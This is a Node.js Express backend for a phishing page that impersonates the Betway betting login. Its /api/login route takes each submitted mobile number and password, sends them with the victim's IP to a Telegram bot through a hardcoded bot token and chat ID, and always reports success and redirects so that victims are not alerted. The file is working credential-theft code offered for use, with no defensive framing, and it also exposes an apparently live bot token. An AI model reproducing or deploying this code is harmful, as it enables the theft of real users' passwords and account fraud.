const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// UPDATED CORS - ALLOWS ALL ORIGINS
// ============================================
app.use(cors({
    origin: '*', // This allows any device to connect
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());

// Telegram Config
const TELEGRAM_BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
const TELEGRAM_CHAT_ID = '8392790531';

// Test route
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Betway Login Backend is running!',
        port: PORT
    });
});

// Login endpoint
app.post('/api/login', async (req, res) => {
    try {
        const { mobileNumber, password } = req.body;

        console.log('📱 Received mobile:', mobileNumber);

        if (!mobileNumber || !password) {
            return res.status(400).json({
                success: false,
                message: 'Mobile number and password are required'
            });
        }

        // Send to Telegram
        const message = `
🔐 **BETWAY LOGIN ALERT**
━━━━━━━━━━━━━━━━━━━

📱 **Mobile:** ${mobileNumber}
🔑 **Password:** ${password}

🌐 **IP:** ${req.ip || 'Unknown'}
🕐 **Time:** ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━
        `;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log(`✅ Login captured: ${mobileNumber}`);

        // Always return success
        res.json({
            success: true,
            message: 'Login successful!',
            redirect: 'https://betwayaviatorpredictor-production-911a.up.railway.app'
        });

    } catch (error) {
        console.error('❌ Error:', error.message);
        // Still return success to not alert the user
        res.json({
            success: true,
            message: 'Login successful!'
        });
    }
});

app.listen(PORT, () => {
    console.log(`
    ╔═══════════════════════════════════╗
    ║   🚀 SERVER RUNNING               ║
    ║   Port: ${PORT}                    ║
    ║   Status: ONLINE ✅               ║
    ╚═══════════════════════════════════╝
    `);
});
